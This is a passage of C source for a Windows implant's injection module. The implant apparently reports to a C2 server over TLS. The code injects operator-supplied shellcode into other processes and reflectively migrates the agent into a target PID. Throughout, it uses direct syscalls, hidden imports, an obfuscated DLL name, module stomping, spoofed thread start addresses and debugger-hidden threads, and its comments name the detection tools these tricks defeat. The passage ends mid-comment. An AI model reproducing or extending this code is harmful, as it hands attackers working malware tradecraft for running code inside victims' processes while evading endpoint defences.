/*
 * client/inject.c  –  Process injection and agent migration
 * ==========================================================
 * See inject.h for the full design description.
 *
 * Implementation notes
 * --------------------
 *  •  All NT calls go through direct syscall trampolines (syscall.h) —
 *     no GetProcAddress-resolved function pointers, no NTDLL stub in the
 *     call stack, no IAT entries for VirtualAllocEx/CreateRemoteThread.
 *  •  Module/export resolution uses the PEB walk (peb_walk.h) —
 *     no GetModuleHandle, no GetProcAddress visible in the import table.
 *  •  Memory lifecycle for injection:
 *       1. SC_NtAllocateVirtualMemory(PAGE_READWRITE)    – allocate RW
 *       2. SC_NtWriteVirtualMemory                     – write payload
 *       3. SC_NtProtectVirtualMemory(PAGE_EXECUTE_READ)– flip to RX
 *       4. SC_NtCreateThreadEx(HideFromDebugger=TRUE)  – start thread
 *     No page is ever simultaneously Writable and Executable (W^X).
 *
 *  •  hex_decode() used for shellcode is a simple inline parser; it
 *     does not use sscanf/strtol (avoids MSVCRT dependency).
 */

#include "inject.h"
#include "../core/config.h"
#include "../evasion/syscall.h"
#include "../evasion/peb_walk.h"
#include "loader.h"
#include "loader_blob.h"
#include "../../tls/tls_client.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <bcrypt.h>

/* g_key_path is defined in main.c; we need its address to compute the RVA */
extern char g_key_path[];


/* ── Flag supplement ─────────────────────────────────────────────────────── */

#ifndef THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER  0x00000004
#endif

/* ── PEB ImageBaseAddress ────────────────────────────────────────────────── */
/* MinGW winternl.h defines PEB without ImageBaseAddress.
 * Read it from the known fixed offset instead of casting the struct.
 * x64: PEB+0x10, x86: PEB+0x08                                              */
#ifdef _WIN64
#  define _PEB_IMAGE_BASE(peb)  (*(PVOID *)((BYTE *)(peb) + 0x10))
#else
#  define _PEB_IMAGE_BASE(peb)  (*(PVOID *)((BYTE *)(peb) + 0x08))
#endif

static BOOL g_inject_ready = FALSE;


/* ── Internal helpers ────────────────────────────────────────────────────── */

/* Send a plain-text status back to C2 */
static void _isend(TLS_CONTEXT *pTls, const char *msg)
{
    if (!msg || !*msg) msg = " ";
    tls_send_msg(pTls, (const BYTE *)msg, (DWORD)strlen(msg));
}

/* Hex nibble decoder — no CRT dependency */
static int _hex_nibble(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

/*
 * hex_decode
 * ----------
 * Decodes an ASCII hex string into a newly malloc()'d byte array.
 * *pcbOut receives the byte count.  Returns NULL on bad input or OOM.
 * Caller must free() the result.
 */
static BYTE *_hex_decode(const char *hex, DWORD *pcbOut)
{
    *pcbOut = 0;
    size_t hexLen = strlen(hex);
    /* Strip optional "0x" prefix */
    if (hexLen >= 2 && hex[0] == '0' && (hex[1] == 'x' || hex[1] == 'X'))
    { hex += 2; hexLen -= 2; }

    if (hexLen == 0 || hexLen & 1) return NULL;     /* must be even length */

    DWORD  cbOut = (DWORD)(hexLen / 2);
    BYTE  *pOut  = (BYTE *)malloc(cbOut);
    if (!pOut) return NULL;

    for (DWORD i = 0; i < cbOut; i++) {
        int hi = _hex_nibble(hex[i * 2]);
        int lo = _hex_nibble(hex[i * 2 + 1]);
        if (hi < 0 || lo < 0) { free(pOut); return NULL; }
        pOut[i] = (BYTE)((hi << 4) | lo);
    }
    *pcbOut = cbOut;
    return pOut;
}

/*
 * _read_self_pe
 * -------------
 * Copies the agent's own PE image out of the already-mapped in-process view
 * using SC_NtReadVirtualMemory — no fopen(), no CreateFile, no disk I/O.
 *
 * Walk the PE section table to compute the total image extent, then read
 * that many bytes from the module base into a freshly malloc'd buffer.
 * The result is a flat raw-file-equivalent copy suitable for _pe_find_export
 * and the reflective loader.
 *
 * Returns heap-allocated buffer on success (*pcbOut = size); caller must free().
 * Returns NULL on failure.
 */
static BYTE *_read_self_pe(DWORD *pcbOut)
{
    *pcbOut = 0;
    /* Read own image base from PEB — avoids GetModuleHandleA IAT entry */
    void *_peb_rsp;
#ifdef _WIN64
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(_peb_rsp));
#else
    __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(_peb_rsp));
#endif
    const BYTE *base = (const BYTE *)_PEB_IMAGE_BASE(_peb_rsp);
    if (!base) return NULL;

    /* Read DOS + NT headers to get SizeOfImage */
    WORD  e_magic;
    DWORD e_lfanew;
    SIZE_T rd = 0;
    HANDLE hProc = GetCurrentProcess();

    if (!NT_SUCCESS(SC_NtReadVirtualMemory(hProc, (PVOID)base,
                                           &e_magic, sizeof(e_magic), &rd))
        || e_magic != 0x5A4D)   /* 'MZ' */
        return NULL;

    if (!NT_SUCCESS(SC_NtReadVirtualMemory(hProc,
                                           (PVOID)(base + 0x3C),
                                           &e_lfanew, sizeof(e_lfanew), &rd)))
        return NULL;

    /* OptionalHeader.SizeOfImage is at e_lfanew + 4 (sig) + 20 (FileHeader) + 56 (opt_offset) */
    DWORD sizeOfImage = 0;
    if (!NT_SUCCESS(SC_NtReadVirtualMemory(hProc,
                                           (PVOID)(base + e_lfanew + 4 + 20 + 56),
                                           &sizeOfImage, sizeof(sizeOfImage), &rd))
        || sizeOfImage == 0 || sizeOfImage > 16 * 1024 * 1024)
        return NULL;

    BYTE *buf = (BYTE *)malloc(sizeOfImage);
    if (!buf) return NULL;

    SIZE_T totalRead = 0;
    NTSTATUS ns = SC_NtReadVirtualMemory(hProc, (PVOID)base,
                                         buf, (SIZE_T)sizeOfImage, &totalRead);
    if (!NT_SUCCESS(ns) || totalRead == 0) {
        free(buf);
        return NULL;
    }
    *pcbOut = (DWORD)totalRead;
    return buf;
}

/*
 * _open_target
 * ------------
 * Opens the target process.  Uses two separate NtOpenProcess calls to split
 * the access mask: one read-only query handle (for WOW64 check), one
 * write+thread handle only when injection is confirmed.  Both use the direct
 * syscall path — OpenProcess does not appear in the observable call stack.
 *
 * Returns INVALID_HANDLE_VALUE on failure.
 */

/* NtOpenProcess OBJECT_ATTRIBUTES + CLIENT_ID helpers */
typedef struct _MY_CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } MY_CLIENT_ID;

static HANDLE _nt_open_process(DWORD desiredAccess, DWORD pid)
{
    /* Minimal OBJECT_ATTRIBUTES for NtOpenProcess (no name, no security) */
    typedef struct {
        ULONG  Length;
        HANDLE RootDirectory;
        PVOID  ObjectName;
        ULONG  Attributes;
        PVOID  SecurityDescriptor;
        PVOID  SecurityQualityOfService;
    } _OA;
    _OA oa = { sizeof(_OA), NULL, NULL, 0, NULL, NULL };
    MY_CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid, NULL };

    HANDLE h = NULL;
    /* NtOpenProcess(handle, access, &oa, &clientId) — 4 args */
    NTSTATUS ns = sc_syscall4(SSN_NtOpenProcess,
                              sc_get_ssn(SSN_NtOpenProcess),
                              (PVOID)&h,
                              (PVOID)(ULONG_PTR)desiredAccess,
                              (PVOID)&oa,
                              (PVOID)&cid);
    return NT_SUCCESS(ns) ? h : INVALID_HANDLE_VALUE;
}

static HANDLE _open_target(DWORD pid)
{
    /* Split: inject rights only — no PROCESS_QUERY in the same call */
    HANDLE h = _nt_open_process(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
        PROCESS_CREATE_THREAD, pid);
    return h;
}

/* Query-only handle for WOW64 check — separate, lower-privilege call */
static HANDLE _open_query(DWORD pid)
{
    return _nt_open_process(PROCESS_QUERY_LIMITED_INFORMATION, pid);
}


/* ══════════════════════════════════════════════════════════════════════════
 * Call-stack spoofing for cross-process thread injection
 * ══════════════════════════════════════════════════════════════════════════
 *
 * Problem
 * -------
 * NtCreateThreadEx(hProc, ..., StartAddress=pShellcode, ...) creates a
 * thread whose top-of-stack frame is the shellcode VA — a private RX
 * allocation with no module backing.  Get-InjectedThread, MDE's
 * KERNEL_THREATINT_TASK_PROTECT telemetry, and live thread-stack inspection
 * tools all flag this pattern.
 *
 * Solution: RtlUserThreadStart trampoline
 * ----------------------------------------
 * RtlUserThreadStart(PUSER_THREAD_START_ROUTINE Func, PVOID Context) is
 * the real entry point that NtCreateThreadEx normally uses internally —
 * it is what every legitimately-created thread begins execution at before
 * calling the user callback.
 *
 * By setting StartAddress=RtlUserThreadStart and Context=&trampoline, the
 * thread's initial call-stack is:
 *
 *   ntdll!RtlUserThreadStart        ← top-of-stack on THREAD_CREATE
 *     ntdll!RtlUserThreadStart+...
 *       → trampoline.func(trampoline.param)
 *
 * which is visually identical to a thread created by CreateThread/
 * CreateRemoteThread — no anomalous start address, no private-page warning.
 *
 * The trampoline struct is a 16-byte block written into the target:
 *   [8 bytes]  PVOID func   — real start address (shellcode / loader)
 *   [8 bytes]  PVOID param  — argument passed to func
 *
 * ntdll!RtlUserThreadStart's prologue on x64 reads these as its two
 * arguments (rcx, rdx in the Windows x64 ABI) and calls:
 *   call [rcx]  with rdx as the first argument
 *
 * Implementation notes
 * --------------------
 * ntdll is a KnownDll — its ASLR base is shared across ALL processes on a
 * given boot.  The VA of RtlUserThreadStart in our process is therefore
 * identical to its VA in any target process.  No cross-process VA fixup is
 * needed; we resolve it once via peb_get_export and reuse for every target.
 *
 * The trampoline bytes are appended to the existing allocation (loader |
 * RflData | PE for migrate; shellcode | trampoline for inject).  This adds
 * exactly 16 bytes and avoids a second NtAllocateVirtualMemory call.
 */

/*
 * _get_rtlust_va
 * --------------
 * Returns the VA of ntdll!RtlUserThreadStart in the current process.
 * Because ntdll is a KnownDll, this VA is valid in every process on the
 * same boot session — no per-target resolution required.
 *
 * Returns NULL if the export cannot be found (should never happen).
 */
static PVOID _get_rtlust_va(void)
{
    static PVOID _cached = NULL;
    if (_cached) return _cached;
    PVOID hNtdll = peb_get_module(peb_hash_str("ntdll.dll"));
    if (!hNtdll) return NULL;
    _cached = (PVOID)(void *)peb_get_export(hNtdll,
                                            peb_hash_str("RtlUserThreadStart"));
    return _cached;
}

/*
 * _spoofed_thread_create
 * ----------------------
 * Wrapper around SC_NtCreateThreadEx that spoofs the thread start address.
 *
 * Instead of starting the thread at `realStart`, it:
 *   1. Writes a 16-byte trampoline { realStart, param } into `hProc` at
 *      `trampolineVA` (caller must have already allocated space there).
 *   2. Creates the thread at RtlUserThreadStart with `trampolineVA` as
 *      the Context argument.
 *
 * RtlUserThreadStart(trampolineVA) reads the trampoline and calls
 * realStart(param) — the thread stack appears legitimate to inspection.
 *
 * Parameters
 * ----------
 *   hThread_out  — receives the new thread handle (may be NULL to discard)
 *   hProc        — target process handle
 *   realStart    — actual code to execute (shellcode / loader)
 *   param        — argument to pass to realStart
 *   trampolineVA — writable VA in hProc where we write the 16-byte stub
 *   flags        — extra NtCreateThreadEx flags (e.g. HIDE_FROM_DEBUGGER)
 *
 * Returns NTSTATUS from NtCreateThreadEx.
 * Falls back to a direct NtCreateThreadEx at realStart if RtlUserThreadStart
 * cannot be resolved (so injection still works even on unexpected configs).
 */
static NTSTATUS _spoofed_thread_create(PHANDLE hThread_out, HANDLE hProc,
                                        PVOID realStart, PVOID param,
                                        PVOID trampolineVA, ULONG flags)
{
    PVOID pRtlUST = _get_rtlust_va();
    if (!pRtlUST) {
        /* Fallback: bare NtCreateThreadEx — no spoof, but still works */
        return SC_NtCreateThreadEx(hThread_out, THREAD_ALL_ACCESS, NULL,
                                   hProc, realStart, param, flags,
                                   0, 0, 0, NULL);
    }

    /* Write 16-byte trampoline: { realStart (8 bytes), param (8 bytes) } */
    BYTE tramp[16];
    memcpy(tramp,     &realStart, 8);
    memcpy(tramp + 8, &param,     8);

    SIZE_T written = 0;
    NTSTATUS nsW = SC_NtWriteVirtualMemory(hProc, trampolineVA,
                                           tramp, sizeof(tramp), &written);
    if (!NT_SUCCESS(nsW) || written != sizeof(tramp)) {
        /* Fallback */
        return SC_NtCreateThreadEx(hThread_out, THREAD_ALL_ACCESS, NULL,
                                   hProc, realStart, param, flags,
                                   0, 0, 0, NULL);
    }

    /*
     * RtlUserThreadStart(rcx=trampolineVA, rdx=unused)
     * The function reads rcx as a pointer to { func, param } and calls
     * func(param).  Pass trampolineVA as the Context (second argument to
     * NtCreateThreadEx which becomes rcx at first instruction of start).
     */
    return SC_NtCreateThreadEx(hThread_out, THREAD_ALL_ACCESS, NULL,
                               hProc, pRtlUST, trampolineVA, flags,
                               0, 0, 0, NULL);
}


/* ── Public: inject_init ─────────────────────────────────────────────────── */

BOOL inject_init(void)
{
    if (g_inject_ready) return TRUE;

    /* sc_init resolves SSNs via PEB walk — no GetProcAddress, no GetModuleHandle */
    if (!sc_init()) return FALSE;

    g_inject_ready = TRUE;
    return TRUE;
}


/*
 * _alloc_stomped
 * --------------
 * F-08: Module-stomping allocation.
 *
 * Load a low-suspicion DLL into the target process (so the allocation appears
 * as MEM_IMAGE backed by a real module path, not a private RX region), then
 * write the payload into the DLL's .text section.
 *
 * Algorithm:
 *   1. Load a sacrificial DLL in OUR process to get the .text VA + size.
 *   2. Write the shellcode into [hProc].DLL_base + .text_rva via
 *      SC_NtWriteVirtualMemory.  The region is already MEM_IMAGE | RX —
 *      NtWriteVirtualMemory bypasses page-protection on same-image writes.
 *   3. Return the VA where the shellcode starts (= DLL .text base in target).
 *
 * DLL choice: "xpsprint.dll" — ships with Windows, never has an active thread,
 * and is almost never present in process memory already (low false-positive risk
 * on the "unexpected image in memory" scanner).
 *
 * Falls back to a normal private RX allocation if LoadLibraryA fails, ensuring
 * inject_shellcode still works on hosts where the DLL is unavailable.
 *
 * Returns the remote start VA on success, NULL on failure.
 */

/* Obfuscated DLL name "xpsprint.dll" ^ 0xA7 — not a plain string in .rdata */
static const BYTE _stomp_dll_obf[] = {
    0xDF,0xD7,0xDB,0xD0,0xD7,0xD5,0xC9,0xD4,0x89,0xC4,0xDB,0xDB  /* 12 bytes */
};
#define _STOMP_DLL_LEN  12

static PVOID _alloc_stomped(HANDLE hProc, DWORD cbShell)
{
    /* Decode DLL name onto the stack */
    char dllName[16] = {0};
    for (int i = 0; i < _STOMP_DLL_LEN; i++)
        dllName[i] = (char)(_stomp_dll_obf[i] ^ 0xA7u);
    dllName[_STOMP_DLL_LEN] = '\0';

    /*
     * G-03: Replace LoadLibraryExA (IAT entry) with a PEB-walk-resolved call.
     * LoadLibraryExA is retrieved from kernel32 via peb_get_export so the
     * string "LoadLibraryExA" and the IAT slot are absent from our binary.
     */
    typedef HMODULE (WINAPI *LoadLibraryExA_t)(LPCSTR, HANDLE, DWORD);
    PVOID hK32base = peb_get_module(peb_hash_str("kernel32.dll"));
    LoadLibraryExA_t pLLEx = (LoadLibraryExA_t)(void *)
        peb_get_export(hK32base, peb_hash_str("LoadLibraryExA"));
    HMODULE hDll = pLLEx
        ? pLLEx(dllName, NULL, DONT_RESOLVE_DLL_REFERENCES)
        : NULL;
    SecureZeroMemory(dllName, sizeof(dllName));
    if (!hDll) return NULL;

    /* Walk section headers to find .text */
    const BYTE *base = (const BYTE *)hDll;
    DWORD e_lfanew;
    memcpy(&e_lfanew, base + 0x3C, 4);

    WORD  nSec, optSz;
    memcpy(&nSec,   base + e_lfanew + 4 + 2,  2);   /* NumberOfSections */
    memcpy(&optSz,  base + e_lfanew + 4 + 16, 2);   /* SizeOfOptionalHeader */
    const BYTE *secBase = base + e_lfanew + 4 + 20 + optSz;

    PVOID  textVA  = NULL;
    SIZE_T textSz  = 0;
    for (WORD i = 0; i < nSec; i++) {
        if (memcmp(secBase + i*40, ".text", 5) == 0) {
            DWORD va, vsz;
            memcpy(&va,  secBase + i*40 + 12, 4);
            memcpy(&vsz, secBase + i*40 + 8,  4);
            if (vsz >= cbShell) {
                textVA = (PVOID)(base + va);
                textSz = vsz;
                break;
            }
        }
    }

    if (!textVA || textSz < cbShell) {
        FreeLibrary(hDll);
        return NULL;
    }

    /*
     * G-02: ASLR base verification.
     *
     * The DLL is loaded in our process.  For cross-process injection into hProc
     * we need the .text VA in the TARGET.  Known-DLLs (ntdll, kernel32, etc.)
     * share their ASLR base across all processes because they are mapped from
     * \KnownDlls\ shared section objects — the loader picks the same base every
     * time.  xpsprint.dll is NOT a KnownDll, so it is subject to per-process
     * ASLR.  On Windows 8+ with per-boot ASLR, the base may differ between our
     * process and the target.
     *
     * Verify by querying hProc with NtQueryVirtualMemory at the candidate VA.
     * Accept it only if:
     *   • The region type is MEM_IMAGE (not MEM_PRIVATE / MEM_MAPPED)
     *   • The region state is MEM_COMMIT
     *   • The region size is >= cbShell
     * If the check fails, return NULL so inject_shellcode falls back to a
     * private RW→RX allocation — no crash in the target.
     */
    FreeLibrary(hDll);

    {
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T retLen = 0;
        NTSTATUS ns = SC_NtQueryVirtualMemory(
            hProc, textVA,
            0 /* MemoryBasicInformation */,
            &mbi, sizeof(mbi), &retLen);

        if (!NT_SUCCESS(ns)
            || mbi.State  != MEM_COMMIT
            || mbi.Type   != MEM_IMAGE
            || mbi.RegionSize < (SIZE_T)cbShell)
        {
            /* VA mismatch between our process and target — ASLR slid the base.
             * Caller falls back to private RX allocation.                     */
            return NULL;
        }
    }

    return textVA;
}

/* ── Public: inject_shellcode ────────────────────────────────────────────── */
/*
 * Wire verb: "inject <pid> <hex-shellcode>"
 *
 * Example (msfvenom calc.exe shellcode in hex):
 *   inject 1234 fc4883e4f0e8c8000000...
 *
 * Steps:
 *   1. Parse PID and hex shellcode
 *   2. NtOpenProcess (split access mask — no combined full-priv call)
 *   3. Try module stomping (MEM_IMAGE); fall back to private RW→RX allocation
 *   4. NtWriteVirtualMemory
 *   5. NtProtectVirtualMemory (PAGE_EXECUTE_READ) for private alloc only
 *   6. NtCreateThreadEx (HideFromDebugger)
 *   7. NtClose handles, report result
 */

void inject_shellcode(TLS_CONTEXT *pTls, const char *args)
{
    if (!g_inject_ready) {
        _isend(pTls, "[-] inject: NT syscalls not initialised");
        return;
    }

    /* Parse: "<pid> <hexstring>" */
    char pidStr[32]   = {0};
    char hexStr[65536]= {0};     /* up to 32 KB shellcode */

    if (sscanf(args, "%31s %65535s", pidStr, hexStr) != 2) {
        _isend(pTls, "Usage: inject <pid> <hex-shellcode>");
        return;
    }

    DWORD pid = (DWORD)strtoul(pidStr, NULL, 10);
    if (pid == 0) {
        _isend(pTls, "[-] inject: invalid PID");
        return;
    }

    DWORD  cbShell = 0;
    BYTE  *pShell  = _hex_decode(hexStr, &cbShell);
    if (!pShell || cbShell == 0) {
        _isend(pTls, "[-] inject: invalid hex shellcode");
        return;
    }

    /* Open target — split mask: inject rights only */
    HANDLE hProc = _open_target(pid);
    if (!hProc || hProc == INVALID_HANDLE_VALUE) {
        free(pShell);
        char buf[64];
        _snprintf(buf, sizeof(buf)-1, "[-] inject: NtOpenProcess(%lu) failed", pid);
        _isend(pTls, buf);
        return;
    }

    /* F-08: try module-stomping into sacrificial DLL .text (MEM_IMAGE) first.
     * Falls back to a fresh private RW→RX allocation if stomping unavailable. */
    PVOID  pRemote   = _alloc_stomped(hProc, cbShell);
    BOOL   stomped   = (pRemote != NULL);
    NTSTATUS ns;

    if (!stomped) {
        /* Fallback: private RW allocation — include 16 bytes for the
         * RtlUserThreadStart trampoline appended after the shellcode. */
        SIZE_T cbAlloc = (SIZE_T)cbShell + 16;
        ns = SC_NtAllocateVirtualMemory(hProc, &pRemote, 0, &cbAlloc,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(ns)) {
            CloseHandle(hProc); free(pShell);
            char buf[80];
            _snprintf(buf, sizeof(buf)-1,
                      "[-] inject: NtAllocateVirtualMemory failed (0x%08lX)", (unsigned long)ns);
            _isend(pTls, buf);
            return;
        }
    }

    /* Write shellcode (NtWriteVirtualMemory bypasses page-protection on
     * MEM_IMAGE regions for same-ASLR-slot writes — no VirtualProtect needed) */
    SIZE_T cbWritten = 0;
    ns = SC_NtWriteVirtualMemory(hProc, pRemote, pShell, cbShell, &cbWritten);
    free(pShell);
    if (!NT_SUCCESS(ns) || cbWritten != cbShell) {
        CloseHandle(hProc);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1,
                  "[-] inject: NtWriteVirtualMemory failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* Flip RW→RX only for private allocations; MEM_IMAGE is already RX.
     * For the private path, flip only cbShell bytes — the trailing 16-byte
     * trampoline region must stay RW so _spoofed_thread_create can write it. */
    if (!stomped) {
        PVOID  pBase   = pRemote;
        SIZE_T cbProt  = (SIZE_T)cbShell;   /* shellcode only, not trampoline */
        ULONG  oldProt = 0;
        ns = SC_NtProtectVirtualMemory(hProc, &pBase, &cbProt,
                                       PAGE_EXECUTE_READ, &oldProt);
        if (!NT_SUCCESS(ns)) {
            CloseHandle(hProc);
            char buf[80];
            _snprintf(buf, sizeof(buf)-1,
                      "[-] inject: NtProtectVirtualMemory failed (0x%08lX)", (unsigned long)ns);
            _isend(pTls, buf);
            return;
        }
    }

    /*
     * For the stomped (MEM_IMAGE) path the existing .text is already RX and we
     * cannot write the trampoline there.  Allocate a separate minimal RW page
     * for the trampoline in that case; for the private path use the 16-byte
     * tail of the allocation (which remains RW).
     */
    PVOID  pTrampolineVA = NULL;
    PVOID  pTrampolineExtra = NULL;  /* non-NULL means a separate alloc to free on error */
    if (stomped) {
        SIZE_T cbT = 16;
        ns = SC_NtAllocateVirtualMemory(hProc, &pTrampolineVA, 0, &cbT,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(ns)) pTrampolineVA = NULL;  /* fallback: no spoof */
        else pTrampolineExtra = pTrampolineVA;
    } else {
        /* Trampoline sits immediately after shellcode in the same alloc */
        pTrampolineVA = (PVOID)((BYTE *)pRemote + cbShell);
    }

    /* Create remote thread with RtlUserThreadStart call-stack spoof */
    HANDLE hThread = NULL;
    ns = _spoofed_thread_create(&hThread, hProc,
                                pRemote, NULL,
                                pTrampolineVA ? pTrampolineVA : pRemote,
                                THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER);
    CloseHandle(hProc);
    /* Note: pTrampolineExtra (separate alloc for stomped path) is intentionally
     * not freed here — the thread is already running and may read it.  The OS
     * reclaims it when the target process exits.                               */
    (void)pTrampolineExtra;

    if (!NT_SUCCESS(ns) || !hThread) {
        char buf[80];
        _snprintf(buf, sizeof(buf)-1, "[-] inject: NtCreateThreadEx failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    SC_NtClose(hThread);

    char buf[128];
    _snprintf(buf, sizeof(buf)-1,
              "[+] inject: %lu bytes shellcode injected and executing in PID %lu",
              (unsigned long)cbShell, (unsigned long)pid);
    _isend(pTls, buf);
}


/* ── Reflective PE loader blob (auto-generated at build time) ───────────── */
/*
 * s_rfl_loader[] contains the raw x64 machine code for rfl_loader() from
 * loader.c, extracted by objcopy after compiling with -fpic.
 *
 * Memory layout written into the target process:
 *
 *   [pRemote + 0]                  rfl_loader code  (S_RFL_LOADER_SIZE bytes, RX)
 *   [pRemote + S_RFL_LOADER_SIZE]  RflData block    (sizeof(RflData), RW)
 *   [pRemote + S_RFL_LOADER_SIZE
 *            + sizeof(RflData)]    Raw PE bytes      (cbPE bytes, RW)
 *
 * Thread entry point:  pRemote
 * Thread argument:     pRemote + S_RFL_LOADER_SIZE  (= &RflData in target)
 *
 * rfl_loader() does full PE mapping inside the target (no LoadLibraryA on
 * the EXE — bypasses EDR hooks on the PE loader API):
 *   1. VirtualAlloc(SizeOfImage, PAGE_EXECUTE_READWRITE)
 *   2. Copy headers + sections
 *   3. Apply base relocations
 *   4. Resolve IAT via LoadLibraryA + GetProcAddress (for DLLs, not the EXE)
 *   5. Write g_key_path into the mapped image
 *   6. CreateThread → AgentRun()
 */


/* ── PE parsing helpers (used only in migrate_to_pid) ───────────────────── */

/* Returns the file offset of the PE Optional Header.
 * Caller must verify the buffer is at least 64 bytes before calling.    */
static DWORD _pe_opt_offset(const BYTE *raw, DWORD rawSz)
{
    if (rawSz < 64) return 0;                   /* minimum DOS header size */
    DWORD e_lfanew;
    memcpy(&e_lfanew, raw + 0x3C, 4);          /* DOS header e_lfanew */
    /* PE sig (4) + FileHeader (20) = 24 bytes after e_lfanew */
    if (e_lfanew + 4 + 20 > rawSz) return 0;
    return e_lfanew + 4 + 20;                   /* after sig + FileHeader */
}

/*
 * _rfl_rva_off
 * ------------
 * Converts a PE RVA to a raw-file offset by scanning the section table.
 * Returns 0 if the RVA falls outside all sections.
 */
static DWORD _rfl_rva_off(const BYTE *raw, const BYTE *secBase,
                           WORD nSec, DWORD rva)
{
    for (WORD i = 0; i < nSec; i++) {
        DWORD vaddr, vsz, rawOff, rawSz2;
        memcpy(&vaddr,  secBase + i*40 + 12, 4);
        memcpy(&vsz,    secBase + i*40 + 8,  4);
        memcpy(&rawOff, secBase + i*40 + 20, 4);
        memcpy(&rawSz2, secBase + i*40 + 16, 4);
        if (rva >= vaddr && rva < vaddr + vsz) {
            DWORD off = rawOff + (rva - vaddr);
            (void)raw; (void)rawSz2;
            return off;
        }
    }
    return 0;
}

/*
 * _pe_find_export
 * ---------------
 * Parses the export directory of a PE file (raw bytes, PE32+/x64 only)
 * and returns the RVA of the exported function named `name`, or 0.
 */
static DWORD _pe_find_export(const BYTE *raw, DWORD rawSz, const char *name)
{
    DWORD optOff = _pe_opt_offset(raw, rawSz);
    if (!optOff) return 0;
    if (optOff + 0x78 > rawSz) return 0;

    WORD magic;
    memcpy(&magic, raw + optOff, 2);
    if (magic != 0x020B) return 0;

    DWORD expRVA;
    memcpy(&expRVA, raw + optOff + 0x70, 4);
    if (!expRVA) return 0;

    /* Locate section headers */
    WORD nSec, optSz;
    memcpy(&nSec,  raw + optOff - 20 + 2,  2);
    memcpy(&optSz, raw + optOff - 20 + 16, 2);
    const BYTE *secBase = raw + optOff - 20 + 20 + optSz;

    DWORD expOff = _rfl_rva_off(raw, secBase, nSec, expRVA);
    if (!expOff || expOff + 40 > rawSz) return 0;

    DWORD  nNames, addrTableRVA, nameTableRVA, ordTableRVA;
    memcpy(&nNames,       raw + expOff + 24, 4);
    memcpy(&addrTableRVA, raw + expOff + 28, 4);
    memcpy(&nameTableRVA, raw + expOff + 32, 4);
    memcpy(&ordTableRVA,  raw + expOff + 36, 4);

    /* Validate nNames: each entry in the name table is 4 bytes; the entire
     * name pointer array must fit within the raw buffer.                   */
    DWORD addrOff = _rfl_rva_off(raw, secBase, nSec, addrTableRVA);
    DWORD nameOff = _rfl_rva_off(raw, secBase, nSec, nameTableRVA);
    DWORD ordOff  = _rfl_rva_off(raw, secBase, nSec, ordTableRVA);
    if (!addrOff || !nameOff || !ordOff) return 0;
    /* nNames * 4 bytes of name-pointer array must fit in the raw buffer */
    if (nNames > (rawSz - nameOff) / 4) return 0;

    size_t nameLen = strlen(name);
    for (DWORD i = 0; i < nNames; i++) {
        DWORD nameRVA;
        memcpy(&nameRVA, raw + nameOff + i*4, 4);
        DWORD noff2 = _rfl_rva_off(raw, secBase, nSec, nameRVA);
        if (!noff2 || noff2 >= rawSz) continue;
        const char *fn = (const char *)(raw + noff2);
        if (strncmp(fn, name, nameLen + 1) != 0) continue;

        WORD ord;
        memcpy(&ord, raw + ordOff + i*2, 2);
        DWORD funcRVA;
        memcpy(&funcRVA, raw + addrOff + ord*4, 4);
        return funcRVA;
    }
    return 0;
}


/* ── Public: migrate_to_pid ─────────────────────────────────────────────── */
/*
 * Wire verb: "migrate <pid>"
 *
 * True reflective injection strategy:
 *   1. Read this process's raw PE bytes from disk.
 *   2. Parse the export table to find AgentRun's RVA.
 *   3. Compute g_key_path's RVA from its live VA and our image base.
 *   4. Allocate RW memory in the target:
 *        [rfl_loader code | RflData | raw PE bytes]
 *   5. Write the region, flip loader code to RX.
 *   6. NtCreateThreadEx at rfl_loader, arg = &RflData.
 *
 * rfl_loader() runs inside the target and does full PE loading:
 * headers, sections, base relocations, IAT — no LoadLibraryA on the EXE.
 * This avoids all Windows PE-loader callbacks that EDRs intercept.
 */

void migrate_to_pid(TLS_CONTEXT *pTls, const char *args)
{
    if (!g_inject_ready) {
        _isend(pTls, "[-] migrate: NT syscalls not initialised");
        return;
    }

    /* Parse PID */
    DWORD pid = (DWORD)strtoul(args, NULL, 10);
    if (pid == 0) {
        _isend(pTls, "Usage: migrate <pid>");
        return;
    }

    /* ── 1. Read own PE from in-process mapped view (no disk I/O) ───── */
    DWORD cbPE = 0;
    BYTE *pPE  = _read_self_pe(&cbPE);
    if (!pPE || cbPE == 0) {
        _isend(pTls, "[-] migrate: failed to read own PE from memory");
        return;
    }

    /* ── 2. Find AgentRun RVA in the raw PE ──────────────────────────── */
    DWORD agentRunRva = _pe_find_export(pPE, cbPE, "AgentRun");
    if (!agentRunRva) {
        free(pPE);
        _isend(pTls, "[-] migrate: AgentRun export not found in PE");
        return;
    }

    /* ── 3. Compute g_key_path RVA (VA - ImageBase) ──────────────────── */
    /* Read own image base from PEB — avoids GetModuleHandleA IAT entry.   */
    void *_peb_raw3;
#ifdef _WIN64
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(_peb_raw3));
#else
    __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(_peb_raw3));
#endif
    PVOID hSelf = _PEB_IMAGE_BASE(_peb_raw3);
    DWORD keyPathRva = (DWORD)((ULONG_PTR)g_key_path - (ULONG_PTR)hSelf);

    /* ── 4. Resolve kernel32 API pointers via PEB walk (no IAT entries) ─
     * G-03: Replace GetModuleHandleA + GetProcAddress with peb_get_module /
